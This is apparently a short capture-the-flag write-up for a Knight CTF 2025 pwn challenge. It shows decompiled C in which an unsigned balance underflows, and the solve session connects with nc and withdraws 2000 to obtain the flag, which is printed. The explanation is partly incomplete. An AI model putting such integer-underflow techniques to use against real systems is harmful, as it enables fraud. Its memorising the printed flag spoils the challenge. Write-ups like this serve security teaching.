---
date: 2025-01-22
description: Broken Money check
platform: Knight CTF 2025
categories: Pwn
tags:
  - integer-overflow
duration:
---

# challenge
decompiled using ghidra
```c
undefined8 main(void)

{
  int iVar1;
  undefined8 uVar2;
  uint local_10;
  uint local_c;
  
  local_c = 1000;
  puts("Welcome to the Knight Bank!");
  fflush(stdout);
  printf("Your current balance is: %u\n",(ulong)local_c);
  fflush(stdout);
  printf("Enter the amount you want to withdraw: ");
  fflush(stdout);
  iVar1 = __isoc99_scanf(&DAT_004020a0,&local_10);
  if (iVar1 == 1) {
    if (local_10 < 0xf4241) {
      local_c = local_c - local_10;
      printf("You withdrew %u. Your new balance is %u.\n",(ulong)local_10,(ulong)local_c);
      fflush(stdout);
      if (local_c < 0xf4241) {
        puts("Better luck next time!");
        fflush(stdout);
      }
      else {
        win_prize();
      }
      uVar2 = 0;
    }
    else {
      puts("Error: You cannot withdraw more than 1,000,000 at a time.");
      fflush(stdout);
      uVar2 = 1;
    }
  }
  else {
    puts("Invalid input. Exiting.");
    fflush(stdout);
    uVar2 = 1;
  }
  return uVar2;
}
```
> Unsigned integers in C are non-negative and wrap around when their value goes below `0`. This happens because they are represented using **modular arithmetic** (modulo `2^N`, where `N` is the number of bits).

> In this case, the variables `local_c` and `local_10` are both declared as `uint` (32-bit unsigned integers). A 32-bit unsigned integer can represent values in the range:

- Minimum: `0`
- Result=2^32+(−1000)=4,294,967,296−1000=4,294,966,296

solve
```sh
nc 45.56.68.122 51337 
Welcome to the Knight Bank!
Your current balance is: 1000
Enter the amount you want to withdraw: 2000
You withdrew 2000. Your new balance is 4294966296.
Congratulations! You win the prize!
KCTF{W0W_KNIGHT_y0U_ARE_R1cH_}
```

